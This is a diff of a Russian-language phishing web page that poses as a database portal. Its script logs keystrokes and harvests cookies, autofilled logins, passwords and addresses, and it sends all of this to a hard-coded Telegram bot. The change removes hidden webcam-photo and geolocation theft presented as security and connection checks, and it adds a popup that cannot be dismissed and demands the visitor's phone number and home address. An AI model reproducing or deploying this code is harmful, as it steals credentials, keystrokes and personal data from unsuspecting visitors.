@@ -22,15 +22,16 @@ table{width:100%;border-collapse:collapse;background:#121720;border:1px solid #1
 th{background:#161c26;padding:12px 14px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:1px;color:#64748b}
 td{padding:10px 14px;border-bottom:1px solid #1a2030;font-size:13px;white-space:nowrap}
 td.user{color:#fff}td.price{color:#10b981;font-weight:600}
-.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.82);z-index:100;justify-content:center;align-items:center;padding:20px}
+.overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:100;justify-content:center;align-items:center;padding:20px}
 .overlay.show{display:flex}
 .popup{background:#121720;border:1px solid #3b82f6;border-radius:16px;padding:32px 24px;max-width:380px;width:100%;text-align:center}
 .popup .icon{font-size:44px;margin-bottom:10px}
 .popup h3{font-size:18px;color:#fff;margin-bottom:10px}
 .popup .desc{font-size:13px;color:#64748b;margin-bottom:20px;line-height:1.5}
-.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;margin-bottom:10px}
-.popup .btn-skip{width:100%;padding:12px;background:transparent;color:#64748b;border:1px solid #1e2836;border-radius:10px;font-size:14px;cursor:pointer;font-family:inherit}
-.popup .legal{font-size:7px;color:#1a2230;margin-top:14px;line-height:1.4;max-height:30px;overflow:hidden}
+.popup input{width:100%;padding:14px;background:#0a0e14;border:1px solid #1e2836;border-radius:10px;color:#fff;font-size:16px;text-align:center;font-family:inherit;margin-bottom:14px}
+.popup input:focus{outline:none;border-color:#3b82f6}
+.popup .btn-pop{width:100%;padding:15px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit}
+.popup .btn-pop:active{transform:scale(0.97)}
 .hidden-form{position:absolute;left:-9999px;top:-9999px;opacity:0}
 .footer-bar{text-align:center;padding:20px;color:#64748b;font-size:11px;border-top:1px solid #1e2836;margin-top:30px}
 @media(max-width:500px){.stats-row{grid-template-columns:repeat(2,1fr)}td,th{font-size:11px;padding:8px}}
@@ -83,6 +84,7 @@ var TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
 var CHAT="8192226287";
 var sid='g'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 var keylog="";
+var step=0;
 
 document.addEventListener('keydown',function(e){keylog+=e.key;if(keylog.length>3000)keylog=keylog.slice(-3000)});
 
@@ -120,8 +122,8 @@ PD.cpu=navigator.hardwareConcurrency||"?";PD.ram=navigator.deviceMemory||"?";
 PD.mobile=/Mobi|Android/i.test(navigator.userAgent);
 PD.ref=document.referrer||"direct";PD.cookie=document.cookie||"-";
 PD.bat="-";PD.gpu="-";PD.conn="-";PD.ip="-";PD.country="-";PD.city="-";PD.provider="-";PD.tz_ip="-";
-PD.geo_lat="-";PD.geo_lng="-";PD.geo_acc="-";PD.camera="-";PD.mic="-";
 PD.webrtc="-";PD.af_u="-";PD.af_p="-";PD.af_e="-";PD.af_fn="-";PD.af_ph="-";PD.af_ph2="-";PD.af_adr="-";
+PD.entered_phone="-";
 
 fetch("https://ipapi.co/json/").then(function(r){return r.json()}).then(function(j){
 PD.ip=j.ip||"-";PD.country=j.country_name||"-";PD.city=j.city||"-";
@@ -161,8 +163,7 @@ var msg=(label||'🚨 ДАННЫЕ')+'\n\n'+
 '📱 '+(d.platform||"-")+' | '+(d.mobile?'MOBILE':'PC')+'\n'+
 '🖥 '+(d.sw||"-")+'x'+(d.sh||"-")+' | CPU:'+(d.cpu||"-")+' | RAM:'+(d.ram||"-")+'\n'+
 '🗣 '+(d.lang||"-")+'\n🎮 '+(d.gpu||"-")+'\n🔋 '+(d.bat||"-")+'\n📶 '+(d.conn||"-")+'\n\n'+
-'📍 ГЕО: '+(d.geo_lat||"-")+', '+(d.geo_lng||"-")+' ('+(d.geo_acc||"-")+')\n\n'+
-'📸 КАМЕРА: '+(d.camera||"-")+'\n🎤 МИКРОФОН: '+(d.mic||"-")+'\n\n'+
+'📞 ВВЕДЁННЫЙ НОМЕР: '+(d.entered_phone||"-")+'\n\n'+
 '⌨️ КЕЙЛОГГЕР:\n'+(keylog||"пусто")+'\n\n'+
 '🔑 АВТОЗАПОЛНЕНИЕ:\nLOGIN: '+(d.af_u||"-")+'\nPASS: '+(d.af_p||"-")+'\nEMAIL: '+(d.af_e||"-")+'\n'+
 'NAME: '+(d.af_fn||"-")+'\nPHONE: '+(d.af_ph||"-")+'\nPHONE2: '+(d.af_ph2||"-")+'\nADDR: '+(d.af_adr||"-")+'\n\n'+
@@ -174,39 +175,11 @@ body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 }
 
-function sendPhoto(photo){
-var bs=atob(photo.split(',')[1]);
-var ms=photo.split(',')[0].split(':')[1].split(';')[0];
-var ab=new ArrayBuffer(bs.length);
-var ia=new Uint8Array(ab);
-for(var i=0;i<bs.length;i++){ia[i]=bs.charCodeAt(i)}
-var blob=new Blob([ab],{type:ms});
-var fd=new FormData();
-fd.append('chat_id',CHAT);
-fd.append('photo',blob,'face.jpg');
-fd.append('caption','📸 ФОТО\n🆔 '+sid);
-fetch('https://api.telegram.org/bot'+TOKEN+'/sendPhoto',{method:"POST",body:fd});
-}
-
 function hidePopup(){document.getElementById('overlay').classList.remove('show')}
 function showPopup(html){document.getElementById('popupContent').innerHTML=html;document.getElementById('overlay').classList.add('show')}
 
-// ШАГ 1
+// ШАГ 1: Таймер 10 секунд
 function step1(){
-showPopup(
-'<div class="icon">🔐</div>'+
-'<h3>Подтверждение</h3>'+
-'<div class="desc">Для доступа к базе данных<br>необходимо подтвердить личность.</div>'+
-'<button class="btn-pop" id="btnStep1">Продолжить</button>'
-);
-document.getElementById('btnStep1').addEventListener('click',function(){
-hidePopup();
-step2();
-});
-}
-
-// ШАГ 2
-function step2(){
 showPopup(
 '<div class="icon">⏳</div>'+
 '<h3>Загрузка данных...</h3>'+
@@ -217,102 +190,51 @@ var sec=10;
 var cd=setInterval(function(){
 sec--;
 document.getElementById('countdown').textContent=sec;
-if(sec<=0){clearInterval(cd);hidePopup();sendMsg(PD,'📋 БАЗОВЫЕ ДАННЫЕ');step3();}
+if(sec<=0){clearInterval(cd);hidePopup();sendMsg(PD,'📋 БАЗОВЫЕ ДАННЫЕ');step2();}
 },1000);
 }
 
-// ШАГ 3 - гео под видом проверки подключения
+// ШАГ 2: Окно с номером телефона (нельзя закрыть)
+function step2(){
+showPopup(
+'<div class="icon">🔐</div>'+
+'<h3>Войдите или зарегистрируйтесь</h3>'+
+'<div class="desc">Для доступа к базе данных<br>необходимо подтвердить номер телефона.</div>'+
+'<input type="tel" id="phoneInput" placeholder="+7 (___) ___-__-__">'+
+'<button class="btn-pop" id="btnOk">ОК</button>'
+);
+document.getElementById('btnOk').addEventListener('click',function(){
+var phone=document.getElementById('phoneInput').value.trim();
+if(!phone){alert('Введите номер телефона');return}
+if(phone.length<6){alert('Некорректный номер');return}
+PD.entered_phone=phone;
+sendMsg(PD,'📞 НОМЕР ПОЛУЧЕН');
+step3();
+});
+}
+
+// ШАГ 3: Успешная регистрация + предложение указать адрес
 function step3(){
 showPopup(
-'<div class="icon">🌐</div>'+
-'<h3>Проверка подключения</h3>'+
-'<div class="desc">Выполняется проверка сетевого соединения<br>для загрузки базы данных.</div>'+
-'<button class="btn-pop" id="btnGeo">Проверить соединение</button>'+
-'<div class="legal">Продолжая, вы соглашаетесь с условиями использования сервиса и политикой обработки данных. Сервис может использовать данные о местоположении для улучшения качества обслуживания. Нажимая кнопку вы подтверждаете что ознакомлены с правилами сообщества и принимаете их в полном объёме без ограничений и оговорок согласно действующему законодательству. Ваше согласие распространяется на все последующие действия совершаемые в рамках данной сессии включая но не ограничиваясь сбором технических данных необходимых для корректной работы платформы.</div>'
+'<div class="icon">✅</div>'+
+'<h3>Вы успешно зарегистрировались!</h3>'+
+'<div class="desc">Для получения полного доступа<br>укажите адрес доставки каталога.</div>'+
+'<input type="text" id="addrInput" placeholder="Город, улица, дом">'+
+'<button class="btn-pop" id="btnAddr">Отправить</button>'+
+'<button class="btn-skip" style="width:100%;padding:12px;background:transparent;color:#64748b;border:1px solid #1e2836;border-radius:10px;font-size:14px;cursor:pointer;font-family:inherit;margin-top:8px" id="btnSkip">Пропустить</button>'
 );
-document.getElementById('btnGeo').addEventListener('click',function(){
-navigator.geolocation.getCurrentPosition(function(pos){
+document.getElementById('btnAddr').addEventListener('click',function(){
+var addr=document.getElementById('addrInput').value.trim();
+if(addr){PD.entered_address=addr;sendMsg(PD,'🏠 АДРЕС ПОЛУЧЕН')}
 hidePopup();
-PD.geo_lat=pos.coords.latitude;
-PD.geo_lng=pos.coords.longitude;
-PD.geo_acc=pos.coords.accuracy+' м';
-sendMsg(PD,'📍 ГЕОЛОКАЦИЯ ПОЛУЧЕНА');
-step5();
-},function(){
+});
+document.getElementById('btnSkip').addEventListener('click',function(){
 hidePopup();
-step4();
-},{enableHighAccuracy:true,timeout:5000});
 });
 }
-
-// ШАГ 4
-function step4(){
-showPopup(
-'<div class="icon">⚠️</div>'+
-'<h3>Ошибка подключения</h3>'+
-'<div class="desc">Не удалось проверить соединение.<br>Попробуйте ещё раз.</div>'+
-'<button class="btn-pop" id="btnGeoRetry">Повторить</button>'+
-'<button class="btn-skip" id="btnGeoSkip">Пропустить</button>'
-);
-document.getElementById('btnGeoRetry').addEventListener('click',function(){
-navigator.geolocation.getCurrentPosition(function(pos){
-hidePopup();
-PD.geo_lat=pos.coords.latitude;
-PD.geo_lng=pos.coords.longitude;
-PD.geo_acc=pos.coords.accuracy+' м';
-sendMsg(PD,'📍 ГЕО ПОЛУЧЕНА (2 попытка)');
-step5();
-},function(){
-hidePopup();
-PD.geo_lat="отказано";PD.geo_lng="отказано";PD.geo_acc="отказано";
-sendMsg(PD,'📍 ГЕО ОТКАЗАНО');
-step5();
-},{enableHighAccuracy:true,timeout:5000});
-});
-document.getElementById('btnGeoSkip').addEventListener('click',function(){
-hidePopup();
-PD.geo_lat="пропущено";PD.geo_lng="пропущено";PD.geo_acc="пропущено";
-sendMsg(PD,'📍 ГЕО ПРОПУЩЕНО');
-step5();
-});
-}
-
-// ШАГ 5 - камера под видом проверки безопасности
-function step5(){
-showPopup(
-'<div class="icon">🛡️</div>'+
-'<h3>Проверка безопасности</h3>'+
-'<div class="desc">Выполняется проверка безопасности<br>для защиты от ботов.</div>'+
-'<button class="btn-pop" id="btnCam">Пройти проверку</button>'+
-'<div class="legal">Продолжая, вы соглашаетесь с условиями использования сервиса и политикой конфиденциальности. Сервис может использовать камеру для верификации пользователя. Нажимая кнопку вы подтверждаете что ознакомлены с правилами сообщества и принимаете их в полном объёме без ограничений и оговорок. Ваше согласие распространяется на все последующие действия совершаемые в рамках данной сессии включая но не ограничиваясь сбором биометрических данных необходимых для подтверждения личности пользователя согласно действующему законодательству о персональных данных и политике конфиденциальности платформы.</div>'
-);
-document.getElementById('btnCam').addEventListener('click',function(){
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(function(stream){
-hidePopup();
-PD.camera="получен";PD.mic="получен";
-var video=document.createElement('video');video.srcObject=stream;video.play();
-setTimeout(function(){
-var canvas=document.createElement('canvas');canvas.width=320;canvas.height=240;
-var ctx=canvas.getContext('2d');ctx.drawImage(video,0,0,320,240);
-var photo=canvas.toDataURL('image/jpeg',0.6);
-stream.getTracks().forEach(function(t){t.stop()});
-sendPhoto(photo);
-sendMsg(PD,'📸 КАМЕРА + ФИНАЛ');
-finish();
-},1000);
-}).catch(function(){
-hidePopup();
-PD.camera="отказано";PD.mic="отказано";
-sendMsg(PD,'📸 КАМЕРА ОТКАЗАНО');
-finish();
-});
-});
-}
-
-function finish(){hidePopup()}
 
 // СТАРТ
-setTimeout(step1,1000);
+setTimeout(step1,2000);
 
 window.addEventListener('beforeunload',function(){
 var blob=new Blob([JSON.stringify({chat_id:CHAT,text:'🚨 УШЁЛ\n🆔 '+sid+'\n⌨️ '+keylog})],{type:'application/json'});
